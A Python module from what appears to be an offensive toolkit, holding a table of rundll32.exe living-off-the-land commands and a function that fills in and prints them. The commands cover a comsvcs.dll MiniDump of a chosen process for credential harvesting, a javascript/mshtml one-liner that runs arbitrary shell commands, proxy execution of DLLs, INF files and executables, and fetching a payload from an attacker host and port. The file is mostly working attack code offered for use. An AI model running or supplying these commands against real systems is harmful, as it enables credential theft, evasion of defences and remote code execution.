"""rundll32.exe LOLBin — DLL execution, proxy execution, comsvcs dump."""
import sys
from typing import Any

MANIFEST = {
    "capability_id": "adxpl.lolbins.rundll32.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["code_execution", "dll_load"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1218.011"],
}

TECHNIQUES = {
    "comsvcs_dump": 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump {pid} C:\\Temp\\d.dmp full',
    "js_exec": 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").Run("cmd /c {cmd}")',
    "dll_exec": 'rundll32.exe {dll_path},{export_func}',
    "url_exec": 'rundll32.exe url.dll,OpenURL http://{lhost}:{lport}/payload.url',
    "advpack": 'rundll32.exe advpack.dll,LaunchINFSection {inf_path},DefaultInstall_SingleUser,1,',
    "pcwrun": 'rundll32.exe pcwutl.dll,LaunchApplication {exe_path}',
}


def run(args: Any) -> int:
    technique = getattr(args, "rundll32_tech", "dll_exec")
    cmd = TECHNIQUES.get(technique, TECHNIQUES["dll_exec"])
    cmd = cmd.format(
        pid=getattr(args, "pid", "<PID>"),
        cmd=getattr(args, "command", "whoami"),
        dll_path=getattr(args, "dll_path", "<DLL_PATH>"),
        export_func=getattr(args, "export_func", "EntryPoint"),
        lhost=getattr(args, "lhost", "<LHOST>"),
        lport=getattr(args, "lport", "8080"),
        inf_path=getattr(args, "inf_path", "<INF_PATH>"),
        exe_path=getattr(args, "exe_path", "<EXE_PATH>"),
    )

    print(f"[*] rundll32.exe LOLBin ({technique}):")
    print(f"  {cmd}")
    print("\n[*] Available techniques: {}".format(", ".join(TECHNIQUES.keys())))
    return 0
